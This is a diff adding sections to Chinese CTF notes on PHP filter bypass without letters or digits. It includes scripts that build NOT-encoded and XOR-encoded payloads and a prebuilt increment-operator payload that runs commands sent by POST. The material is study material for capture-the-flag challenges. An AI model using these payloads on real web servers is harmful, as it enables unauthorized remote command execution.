@@ -1292,9 +1292,13 @@ http://xxx/?p=uniq${IFS}f???.php
 
 > 如 preg_match("/[A-Za-z0-9]+/",$code)
 
-##### 无数字字母绕过
+##### 无数字字母绕过情况一
 
-条件: 题目不允许数字和字母输入
+条件: 
+
+- 题目不允许数字和字母输入
+- 需要能直接执行命令，如 `system()` ，而不是 `eval()` 。因为题目不允许输入字母，system 有字母
+- 可以试试使用 `` 来执行命令
 
 ###### 利用通配符
 
@@ -1332,6 +1336,37 @@ print(r.text)
 ```
 
 ##### 取反
+
+需要没过滤符号: `~`
+
+###### 构造取反 url 的脚本 (最简方法)
+
+```python
+def action(s):
+    k=''
+    for j in s:
+        i = ord(j)
+        b = bin(i)[2:]
+        if len(b)%4!=0:
+            b=(4-len(b)%4)*'0'+b
+        t=''
+        for l in b:
+            if l=='1':
+                t+='0'
+            else:
+                t+='1'
+        fin = hex(int(t,2))
+        fin=fin.replace('0x','')
+        k+=('%'+fin.zfill(2))
+    return "(~"+k+")"
+while True:
+    param=action(input("\n[+] your function：") )+action(input("[+] your command："))
+    print(param+';')
+```
+
+运行方法如下:
+
+![image-20230905093344853](static/img/image-20230905093344853.png)
 
 ###### 取反通用方法
 
@@ -1414,6 +1449,92 @@ echo '(~'.$d.')';
 http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
 ```
 
+##### 异或
+
+需要没过滤符号: `^`
+
+需要两个脚本文件 (`异或绕过.php`、`xor_rce.py`)，在同一个目录中，从现在开始构建
+
+脚本1: 异或绕过.php
+
+该脚本用于生成 `xor_rce.txt`，目的是为了排除正则表达式 `$preg = "/[0-9]|[a-z]/i"` 以外的字符，根据具体的题目**修改**正则表达式即可
+
+```php
+<?php
+// 根据不同的题目，修改这个正则表达式（一般直接复制题目中的正则过来即可）
+$preg = "/[0-9]|[a-z]/i";
+  
+$myfile = fopen("xor_rce.txt", "w");
+$contents="";
+for ($i=0; $i < 256; $i++) { 
+	for ($j=0; $j <256 ; $j++) { 
+
+		if($i<16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j<16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
+    }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)^urldecode($b));
+		if (ord($c)>=32&ord($c)<=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+```
+
+脚本2:xor_rce.py
+
+```python
+# -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("xor_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"^\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+```
+
+执行该脚本即可构建异或字符，如图
+
+![image-20230905094229433](static/img/image-20230905094229433.png)
+
 ##### 自增漏洞
 
 - 暂时没学会这种方法的原理，不要深究
@@ -1429,6 +1550,23 @@ http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%C
   3. **PHP的"++"操作符在溢出时的行为**：在PHP中，如果一个整数增加到了PHP_INT_MAX，再增加一将会让它变成一个浮点数。这可能会被用来绕过某些整数范围的检查。
 
   以上这些情况都可能在CTF比赛中被用来设计题目。解决这类问题需要对PHP语言的特性有深入的理解。
+
+###### 通用方法
+
+```
+$_=[];$_=$_.'';$_=$_[';'=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=$_;$_++;$_++;$____=$_;$_++;$_____=$_;$_++;$_++;$_++;$______=$_;$_______=$_;$________=$_;$_++;$_________=$_;$__________=$_;$_++;$_++;$_++;$_++;$_++;$___________=$_;$____________=$______.$___________.$______.$_________.$__.$___;$_____________=$_____.$____.$______.$_________;
+$_____________='_'.$_____________;
+$_____________=$$_____________;
+$____________($_____________[_]);
+
+_=ls
+```
+
+在 url 传参时，记得把参数做 url 编码。这段的  `_=ls` ，就是给 POST 方法传入 `ls` 字符串，这里的 `ls` 也可以改成其他。（提前构造好的，所以无论题目有没有 POST 方法，都使用 POST 传入这段）
+
+使用方法如图:
+
+![image-20230905100153113](static/img/image-20230905100153113.png)
 
 ###### 访问 phpinfo
 
